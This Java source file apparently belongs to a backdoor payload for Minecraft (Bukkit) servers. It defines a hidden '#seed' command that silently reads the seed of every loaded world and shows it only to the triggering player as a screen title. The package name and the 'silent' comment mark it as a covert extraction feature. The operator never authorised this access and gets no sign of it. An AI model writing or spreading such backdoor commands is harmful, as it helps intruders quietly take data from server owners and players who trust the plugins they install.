package dev.naruto.astrox.payload.commands;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * #seed - Extract world seed (silent)
 */
public class SeedCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        StringBuilder seeds = new StringBuilder();

        for (World world : Bukkit.getWorlds()) {
            long seed = world.getSeed();
            seeds.append(world.getName()).append(": ").append(seed).append(" ");
        }

        // Silent response (only to sender via plugin message or title)
        sender.sendTitle("§8Seed", seeds.toString(), 10, 70, 20);
    }
}
